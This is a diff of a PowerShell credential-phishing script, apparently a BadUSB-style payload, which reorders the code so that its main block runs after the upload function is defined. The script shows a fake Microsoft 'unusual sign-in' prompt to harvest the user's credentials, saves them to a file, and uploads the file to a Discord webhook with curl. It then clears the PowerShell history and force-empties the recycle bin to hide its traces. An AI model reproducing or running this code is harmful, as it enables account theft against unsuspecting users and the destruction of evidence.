@@ -54,25 +54,6 @@ $key = New-Object -ComObject WScript.Shell
 $key.SendKeys('{CapsLock}')
 }
 }
-#----------------------------------------------------------------------------------------------------
-
-
-Pause-Script
-
-Caps-Off
-
-Add-Type -AssemblyName System.Windows.Forms
-
-[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")
-
-$creds = Get-Creds
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-
-echo $creds >> $env:USERPROFILE\$FileName
-
-
 
 
 function Upload-Discord {
@@ -97,6 +78,29 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
+#----------------------------------------------------------------------------------------------------
+
+
+Pause-Script
+
+Caps-Off
+
+Add-Type -AssemblyName System.Windows.Forms
+
+[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")
+
+$creds = Get-Creds
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+
+echo $creds >> $env:USERPROFILE\$FileName
+
+
+#--------------------------------------------------------------------
+
+
+
 Upload-Discord -file "User-Creds.txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
@@ -112,3 +116,4 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
